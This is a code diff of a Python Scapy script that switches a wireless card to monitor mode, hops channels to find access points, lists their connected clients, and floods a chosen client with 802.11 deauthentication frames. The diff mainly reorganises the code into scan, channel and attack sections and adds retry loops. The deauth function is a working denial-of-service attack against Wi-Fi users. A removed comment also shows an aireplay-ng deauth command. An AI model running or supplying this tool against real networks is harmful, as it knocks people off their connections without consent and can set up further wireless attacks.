@@ -3,7 +3,7 @@ import os
 from threading import Thread
 import time
 
-# global variables 
+#------ global variables ------ 
 
 interface = "" # indentfied Network Card
 AP_target = []
@@ -16,6 +16,8 @@ index_AP_target = 0
 station_dict = {} # {key - index ,value - mac_client}
 index_client_target = 0
 
+
+# ------  network card Mode ------
 
 def changeToMonitorMode(iface):
     os.system("sudo ifconfig " + iface + " down")
@@ -31,7 +33,28 @@ def changeToManagedMode(iface):
     os.system("iwconfig") #show as the mode changed
 
 
-def packetHandler(packet):
+#--- Scan ---
+
+def scanWifi() ->None:
+    global interface
+    #Scanning access point Wifi
+    print("scanning for Wifi...")
+    channel_changer = Thread(target=changeChannels(interface))
+    channel_changer.daemon = True
+    channel_changer.start()
+    sniff(iface=interface ,prn = packetHandlerForAP, timeout = 10)
+
+def scanClients() -> None:
+    print("scanning clients...")
+    sniff(iface=interface, prn = packetHandlerForClients , timeout=10)
+
+    if len(station_dict) == 0: # the clients dictionary is empty
+        print("did not find any client")
+
+
+#------ Handling packet ------
+
+def packetHandlerForAP(packet):
     global index_AP_target
     global AP_dict
     # if packet has 802.11 layer (Dot11 = 802.11)
@@ -65,21 +88,13 @@ def packetHandler(packet):
         
 
 
-#if the picked Wifi mac (router) matches
-
-def packetUsers(packet):
+def packetHandlerForClients(packet):
     global AP_target
     BSSID_target = AP_target[0]
     global AP_dict
     global station_dict
     global index_client_target
     flag = False
-
-    #     global client_list
-#    if ((pkt.addr2==target_mac or pkt.addr3 == target_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff"):
-#       if pkt.addr1 not in client_list:
-#         if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
-#             client_list.append(pkt.addr1)
 
     if packet.addr1 != "ff:ff:ff:ff:ff:ff" and (packet.addr2 == BSSID_target or packet.addr3 == BSSID_target):
                 if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
@@ -95,25 +110,11 @@ def packetUsers(packet):
                         print("index: ", index_client_target, "    addr1(src): ", packet.addr1, "   addr2(dest): ", packet.addr2,  "    addr3(?): ", packet.addr3)
                         index_client_target = index_client_target + 1
 
-    
-    # for i in AP_dict:
-    #         key_list = AP_dict.get(i)
-    #         if packet.addr2 in key_list:
-    #             flag = True
-    #             break
-    
-    #     if flag == False:
-    #         for i in station_dict:
-    #                 key_list = station_dict.get(i)
-    #                 if packet.addr2 in key_list:
-    #                     flag = True
-    #                     break
-            
-    #         if flag == False:
 
-def change_channel(iface):
+# ------ Channel ------
+
+def changeChannels(iface):
     ch = 1
-    #---------------Need to set timer in this loop ---------------
     start = time.time()
 
     while True:
@@ -136,6 +137,8 @@ def changeChannelToAP(index : int) -> None:
     channel_target_converted = str(channel_target)
     os.system("sudo iwconfig " + interface + " channel " + channel_target_converted)
 
+
+# --- deauthotication attack ---
 def deauth(client_index:int) -> None:
     global interface
     global station_dict
@@ -149,13 +152,6 @@ def deauth(client_index:int) -> None:
         pkt = RadioTap()/Dot11(addr1=station_dict.get(client_index), addr2=AP_target[0], addr3=AP_target[1])/Dot11Deauth()
         sendp(pkt, iface=interface, count=30, inter = .001)
 
-def scanClients() -> None:
-    print("scanning clients...")
-    sniff(iface=interface, prn = packetUsers , timeout=10)
-
-    if len(station_dict) == 0: # the clients dictionary is empty
-        print("did not find any client")
-
 
 
 def main():
@@ -168,17 +164,18 @@ def main():
     os.system("clear")
     changeToMonitorMode(interface)
 
-    #Scanning access point Wifi
-    print("scanning for Wifi...")
-    channel_changer = Thread(target=change_channel(interface))
-    channel_changer.daemon = True
-    channel_changer.start()
-    sniff(iface=interface ,prn = packetHandler, timeout = 10)
+    #--- Scanning access point Wifi ---
+    retry_wifi = 'y'
+    while retry_wifi =='y':
+        
+        scanWifi()
+
+        if len(AP_dict) == 0: #if we doesn't found any access point
+            print("doesn't found any access points")
+        
+        retry_wifi = input("for scanning AP again please insert - 'y' : ")
 
 
-    if len(AP_dict) == 0: #if we doesn't found any access point
-        print("doesn't found access points")
-        sys.exit() # end script
 
     convertedChosen = -1
     while True:
@@ -203,27 +200,29 @@ def main():
     # saves the details of the chosen AP
     AP_target = AP_dict.get(convertedChosen)
 
-    # Scanning clients
-    while True:
+    # --- Scanning clients ---
+    retry_clients = 'y'
+    while retry_clients == 'y':
+
         scanClients()
-        retry = input("For scanning again please press 'y': ")
-        if retry != "y":
-            break
+
+        if len(station_dict) == 0:
+            print("doesn't found any clients")
+
+        retry_clients = input("For scanning clients again please insert - 'y': ")
     
 
     if len(station_dict) == 0:
         sys.exit() # end script
         
     client_index = input("Choose client to attack: ")
+    
+
+    #--- Attack ---
     deauth(int(client_index))
 
 
     changeToManagedMode(interface) # change back to default mode
-
-    
-    #Attack
-    
-    #os.system("sudo aireplay-ng --deauth 2000 -a "bssid" -c "station" ")
 
 
 if __name__ == "__main__":
